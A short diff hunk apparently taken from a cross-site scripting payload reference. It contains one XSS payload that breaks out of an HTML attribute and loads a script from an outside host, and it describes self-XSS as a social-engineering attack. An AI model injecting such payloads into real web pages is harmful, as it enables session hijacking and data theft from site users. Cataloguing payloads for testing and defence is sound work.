@@ -63,7 +63,7 @@ Payload
 
     "><script src=https://hello.xss></script>
 
-<self-xss>
+self-xss
 This vulnerability is implemented through social engineering attacks that force the victim to enter malicious code into their console 
   
 -------------------------------------------------------
